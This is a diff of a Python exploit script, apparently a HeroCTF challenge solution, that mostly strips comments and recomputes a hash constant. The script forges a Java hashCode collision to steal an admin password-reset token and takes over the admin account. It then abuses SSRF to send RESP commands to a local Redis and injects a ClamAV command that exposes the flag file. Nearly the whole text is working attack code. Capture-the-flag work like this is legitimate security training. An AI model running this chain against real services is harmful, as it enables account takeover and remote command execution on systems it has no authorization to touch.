@@ -5,13 +5,9 @@ import requests
 import time
 
 TARGET = "http://localhost:6969/"
-#TARGET = "http://dyn03.heroctf.fr:14685/"
 PASSWORD = "password123"
 
-ADMIN_HASH = -2003659892  # java String.hashCode() of "admin@example.com"
-
 def java_hash(s: str) -> int:
-    """Java String.hashCode()"""
     h = 0
     for ch in s:
         h = (31 * h + ord(ch)) & 0xFFFFFFFF
@@ -19,8 +15,9 @@ def java_hash(s: str) -> int:
         h -= 0x100000000
     return h
 
+ADMIN_HASH = java_hash("admin@example.com")
+
 def find_string_for_hash(target_hash: int, max_len: int = 10, attempts: int = 400000) -> str:
-    """Generate a short Unicode string (no surrogates) whose Java hashCode equals target_hash."""
     targ_u = target_hash & 0xFFFFFFFF
     for L in range(3, max_len + 1):
         for _ in range(attempts):
@@ -134,7 +131,6 @@ def inject_clamav_command(session: requests.Session, out_path: str, flag_glob: s
         json={"url": "http://127.0.0.1:6379/", "filename": "x", "httpMethod": method},
     )
     print("[+] Inject response:", resp.text)
-    print("[*] Here we expect an error because we are speaking RESP protocol")
     return resp.text
 
 def download_file(session: requests.Session, file_id: int) -> bytes:
@@ -144,7 +140,6 @@ def download_file(session: requests.Session, file_id: int) -> bytes:
     return base64.b64decode(b64) if b64 else b""
 
 if __name__ == "__main__":
-    # Step 1: register a probe user to learn the current ID
     probe_session = requests.Session()
     probe_username = f"probe_{uuid.uuid4().hex[:8]}"
     probe_email = f"{probe_username}@example.com"
@@ -156,13 +151,11 @@ if __name__ == "__main__":
         exit(1)
     print(f"[+] Probe user id: {probe_id}")
 
-    # Step 2: target the next user id
     target_id = probe_id + 1
     target_hash = ADMIN_HASH + (1 - target_id)
     crafted_email = find_string_for_hash(target_hash)
     print(f"[+] Crafted email for userId {target_id}: {crafted_email.encode('unicode_escape').decode()}")
 
-    # Step 3: register crafted user (should get id = target_id)
     crafted_session = requests.Session()
     crafted_username = f"hacker_{uuid.uuid4().hex[:8]}"
     register_user(crafted_session, crafted_username, crafted_email, PASSWORD)
@@ -173,7 +166,6 @@ if __name__ == "__main__":
         print("[-] Crafted user id mismatch; adjust logic and retry")
         exit(1)
 
-    # Step 4: trigger reset and extract token
     send_password_reset(crafted_session, crafted_email)
     token = get_reset_token(crafted_session, crafted_email)
     if token:
@@ -185,14 +177,11 @@ if __name__ == "__main__":
         print("[-] Could not retrieve reset token; aborting")
         exit(1)
 
-    # Step 5: reset admin password
     reset_password(crafted_session, "admin@example.com", admin_token, PASSWORD)
 
-    # Step 6: Switch to admin session
     admin_session = requests.Session()
     login_user(admin_session, "admin", PASSWORD)
 
-    # Step 7: Upload dummy to get writeable file path and file id
     entry = upload_file(admin_session, b"hello", name="holder.txt")
     out_path = entry.get("filePath")
     file_id = entry.get("id")
@@ -201,13 +190,10 @@ if __name__ == "__main__":
         exit(1)
     print(f"[+] Uploaded file path: {out_path}, id: {file_id}")
 
-    # Step 8: Inject clamav command to read the flag
     inject_clamav_command(admin_session, out_path)
 
-    # Step 9: Sleep
     print("[*] Waiting for ClamAV to scan")
     time.sleep(120)
 
-    # Step 10: Download the file to get the flag
     flag_data = download_file(admin_session, file_id)
     print(f"[+] Retrieved file data:\n{flag_data.decode(errors='ignore')}")
